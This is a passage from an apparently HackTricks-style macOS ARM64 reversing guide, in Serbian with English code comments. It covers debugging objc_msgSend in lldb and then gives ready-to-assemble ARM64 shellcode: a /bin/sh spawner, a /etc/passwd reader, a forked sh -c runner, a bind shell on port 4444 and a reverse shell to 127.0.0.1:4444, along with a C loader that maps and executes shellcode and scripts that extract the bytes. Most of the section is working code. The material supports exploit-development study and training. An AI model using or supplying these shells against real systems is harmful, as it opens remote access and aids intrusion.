Na primer, poziv `gettimeofdate` čita vrednost `timeval` direktno iz comm page.

### objc_msgSend

Veoma je često naći ovu funkciju u Objective-C ili Swift programima. Ova funkcija omogućava pozivanje metode Objective-C objekta.

Parameters ([more info in the docs](https://developer.apple.com/documentation/objectivec/1456712-objc_msgsend)):

- x0: self -> Pointer to the instance
- x1: op -> Selector of the method
- x2... -> Rest of the arguments of the invoked method

So, if you put breakpoint before the branch to this function, you can easily find what is invoked in lldb with (in this example the object calls an object from `NSConcreteTask` that will run a command):
```bash
# Right in the line were objc_msgSend will be called
(lldb) po $x0
<NSConcreteTask: 0x1052308e0>

(lldb) x/s $x1
0x1736d3a6e: "launch"

(lldb) po [$x0 launchPath]
/bin/sh

(lldb) po [$x0 arguments]
<__NSArrayI 0x1736801e0>(
-c,
whoami
)
```
> [!TIP]
> Podešavanjem env promenljive **`NSObjCMessageLoggingEnabled=1`** moguće je log-ovati kada se ova funkcija pozove u fajlu kao što je `/tmp/msgSends-pid`.
>
> Pored toga, podešavanjem **`OBJC_HELP=1`** i pokretanjem bilo kog binarnog fajla možete videti druge environment variables koje možete koristiti da logujete kada se određene Objc-C akcije dese.

Kada se ova funkcija pozove, potrebno je pronaći pozvani metod označene instance, zbog čega se izvode različite pretrage:

- Izvrši optimističko pretraživanje cache-a:
- Ako je uspešno, gotovo
- Stekni runtimeLock (read)
- Ako (realize && !cls->realized) realize class
- Ako (initialize && !cls->initialized) initialize class
- Pokušaj sopstveni cache klase:
- Ako je uspešno, gotovo
- Pokušaj listu metoda klase:
- Ako je pronađeno, popuni cache i gotovo
- Pokušaj cache superklase:
- Ako je uspešno, gotovo
- Pokušaj listu metoda superklase:
- Ako je pronađeno, popuni cache i gotovo
- Ako (resolver) pokušaj method resolver, i ponovi od class lookup
- Ako si i dalje ovde (= sve ostalo je bilo neuspešno) pokušaj forwarder

### Shellcodes

Za kompilaciju:
```bash
as -o shell.o shell.s
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib

# You could also use this
ld -o shell shell.o -syslibroot $(xcrun -sdk macosx --show-sdk-path) -lSystem
```
Da biste izdvojili bajtove:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/b729f716aaf24cbc8109e0d94681ccb84c0b0c9e/helper/extract.sh
for c in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n '\\x'$c
done
```
Za novije macOS:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/fc0742e9ebaf67c6a50f4c38d59459596e0a6c5d/helper/extract.sh
for s in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n $s | awk '{for (i = 7; i > 0; i -= 2) {printf "\\x" substr($0, i, 2)}}'
done
```
<details>

<summary>C code за тестирање shellcode</summary>
```c
// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
// gcc loader.c -o loader
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "<INSERT SHELLCODE HERE>";

int main(int argc, char **argv) {
printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));

void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);

if (ptr == MAP_FAILED) {
perror("mmap");
exit(-1);
}
printf("[+] SUCCESS: mmap\n");
printf("    |-> Return = %p\n", ptr);

void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
printf("[+] SUCCESS: memcpy\n");
printf("    |-> Return = %p\n", dst);

int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);

if (status == -1) {
perror("mprotect");
exit(-1);
}
printf("[+] SUCCESS: mprotect\n");
printf("    |-> Return = %d\n", status);

printf("[>] Trying to execute shellcode...\n");

sc = ptr;
sc();

return 0;
}
```
</details>

#### Shell

Preuzeto sa [**here**](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s) i objašnjeno.

{{#tabs}}
{{#tab name="with adr"}}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{{#endtab}}

{{#tab name="with stack"}}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
; We are going to build the string "/bin/sh" and place it on the stack.

mov  x1, #0x622F  ; Move the lower half of "/bi" into x1. 0x62 = 'b', 0x2F = '/'.
movk x1, #0x6E69, lsl #16 ; Move the next half of "/bin" into x1, shifted left by 16. 0x6E = 'n', 0x69 = 'i'.
movk x1, #0x732F, lsl #32 ; Move the first half of "/sh" into x1, shifted left by 32. 0x73 = 's', 0x2F = '/'.
movk x1, #0x68, lsl #48   ; Move the last part of "/sh" into x1, shifted left by 48. 0x68 = 'h'.

str  x1, [sp, #-8] ; Store the value of x1 (the "/bin/sh" string) at the location `sp - 8`.

; Prepare arguments for the execve syscall.

mov  x1, #8       ; Set x1 to 8.
sub  x0, sp, x1   ; Subtract x1 (8) from the stack pointer (sp) and store the result in x0. This is the address of "/bin/sh" string on the stack.
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.

; Make the syscall.

mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

```
{{#endtab}}

{{#tab name="with adr for linux"}}
```armasm
; From https://8ksec.io/arm64-reversing-and-exploitation-part-5-writing-shellcode-8ksec-blogs/
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{{#endtab}}
{{#endtabs}}

#### Čitanje pomoću cat

Cilj je izvršiti `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)`, tako da je drugi argument (x1) niz params (što u memoriji znači stack of addresses).
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the execve syscall
sub sp, sp, #48        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, cat_path
str x0, [x1]           ; Store the address of "/bin/cat" as the first argument
adr x0, passwd_path    ; Get the address of "/etc/passwd"
str x0, [x1, #8]       ; Store the address of "/etc/passwd" as the second argument
str xzr, [x1, #16]     ; Store NULL as the third argument (end of arguments)

adr x0, cat_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


cat_path: .asciz "/bin/cat"
.align 2
passwd_path: .asciz "/etc/passwd"
```
#### Pozovi command pomoću sh iz fork-a tako da main process ne bude ubijen
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the fork syscall
mov x16, #2            ; Load the syscall number for fork (2) into x8
svc 0                  ; Make the syscall
cmp x1, #0             ; In macOS, if x1 == 0, it's parent process, https://opensource.apple.com/source/xnu/xnu-7195.81.3/libsyscall/custom/__fork.s.auto.html
beq _loop              ; If not child process, loop

; Prepare the arguments for the execve syscall

sub sp, sp, #64        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, sh_path
str x0, [x1]           ; Store the address of "/bin/sh" as the first argument
adr x0, sh_c_option    ; Get the address of "-c"
str x0, [x1, #8]       ; Store the address of "-c" as the second argument
adr x0, touch_command  ; Get the address of "touch /tmp/lalala"
str x0, [x1, #16]      ; Store the address of "touch /tmp/lalala" as the third argument
str xzr, [x1, #24]     ; Store NULL as the fourth argument (end of arguments)

adr x0, sh_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


_exit:
mov x16, #1            ; Load the syscall number for exit (1) into x8
mov x0, #0             ; Set exit status code to 0
svc 0                  ; Make the syscall

_loop: b _loop

sh_path: .asciz "/bin/sh"
.align 2
sh_c_option: .asciz "-c"
.align 2
touch_command: .asciz "touch /tmp/lalala"
```
#### Bind shell

Bind shell sa [https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s) na **port 4444**
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_bind:
/*
* bind(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 0.0.0.0 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #104
svc  #0x1337

call_listen:
// listen(s, 2)
mvn  x0, x3
lsr  x1, x2, #3
mov  x16, #106
svc  #0x1337

call_accept:
// c = accept(s, 0, 0)
mvn  x0, x3
mov  x1, xzr
mov  x2, xzr
mov  x16, #30
svc  #0x1337

mvn  x3, x0
lsr  x2, x16, #4
lsl  x2, x2, #2

call_dup:
// dup(c, 2) -> dup(c, 1) -> dup(c, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
#### Reverse shell

Sa [https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s), revshell na **127.0.0.1:4444**
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_connect:
/*
* connect(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 127.0.0.1 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
movk x1, #0x007F, lsl #32
movk x1, #0x0100, lsl #48
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #98
svc  #0x1337

lsr  x2, x2, #2

call_dup:
// dup(s, 2) -> dup(s, 1) -> dup(s, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
{{#include ../../../banners/hacktricks-training.md}}
